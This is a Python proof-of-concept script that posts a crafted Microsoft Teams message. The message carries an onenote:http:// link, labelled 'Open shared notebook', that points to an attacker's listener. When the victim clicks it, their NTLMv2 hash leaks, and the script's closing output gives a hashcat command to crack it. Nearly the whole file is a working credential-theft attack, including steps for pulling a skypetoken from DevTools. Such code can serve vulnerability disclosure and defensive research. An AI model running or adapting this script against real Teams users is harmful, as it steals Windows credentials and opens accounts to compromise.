"""
Teams onenote:// NTLM Probe Sender
Teams onenote:// → NTLMv2 Credential Theft POC

Sends a crafted Teams chat message containing an onenote:http:// link
pointing to the attacker's NTLM capture server.
When the victim clicks the link, OneNote opens silently and performs
an NTLM handshake with the listener, leaking the victim's NTLMv2 hash.

Usage:
    python send_probe.py <skypetoken> <thread_id> <attacker_ip> [port]

Arguments:
    skypetoken    Attacker's Teams skypetoken (from DevTools → Network →
                  any msgapi.teams.live.com request → Authentication header)
    thread_id     Target conversation thread ID (from the same request URL:
                  /v1/users/ME/conversations/<thread_id>/messages)
    attacker_ip   IP address of the machine running listener.py
    port          Port listener.py is running on (default: 8877)

Example:
    python send_probe.py "eyJhbG..." "19:uni01_xxx@thread.v2" 192.168.1.7 8877

Requirements:
    Python 3.6+, no external dependencies.
    listener.py must be running before the victim clicks.
"""
import sys
import json
import time
import random
import urllib.request
import urllib.error

CHAT_API = "https://msgapi.teams.live.com"


def send_message(content, skype_token, thread_id):
    """POST a RichText/Html message to the target Teams conversation."""
    client_message_id = str(int(time.time() * 1000)) + str(random.randint(1000, 9999))

    body = json.dumps({
        "content":         content,
        "messagetype":     "RichText/Html",
        "contenttype":     "text",
        "clientmessageid": client_message_id,
    }).encode()

    url = f"{CHAT_API}/v1/users/ME/conversations/{thread_id}/messages"
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type",      "application/json")
    req.add_header("Authentication",    f"skypetoken={skype_token}")
    req.add_header("User-Agent",        "Mozilla/5.0 Teams")
    req.add_header("X-Ms-Client-Type",  "web")

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            result = json.loads(resp.read())
            arrival = result.get("OriginalArrivalTime", "?")
            print(f"[+] Message delivered  (ArrivalTime: {arrival})")
            return True

    except urllib.error.HTTPError as ex:
        print(f"[-] HTTP {ex.code}: {ex.read().decode()[:300]}")
        return False

    except Exception as ex:
        print(f"[-] Error: {ex}")
        return False


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        sys.exit(1)

    skype_token  = sys.argv[1]
    thread_id    = sys.argv[2]
    attacker_ip  = sys.argv[3]
    port         = int(sys.argv[4]) if len(sys.argv) > 4 else 8877

    link_text    = "Open shared notebook"
    notebook_url = f"http://{attacker_ip}:{port}/notebook"
    payload_html = f'<a href="onenote:{notebook_url}">{link_text}</a>'

    print(f"[*] Teams onenote:// NTLM Probe Sender")
    print(f"[*] Thread    : {thread_id}")
    print(f"[*] Listener  : {attacker_ip}:{port}")
    print(f"[*] Payload   : {payload_html}")
    print()

    success = send_message(payload_html, skype_token, thread_id)
    if success:
        print()
        print(f"[*] Message sent. Waiting for victim to click...")
        print(f"[*] Watch listener.py output for captured hash.")
        print(f"[*] Once hash appears: hashcat -m 5600 captured_hashes.txt wordlist.txt")


if __name__ == "__main__":
    main()
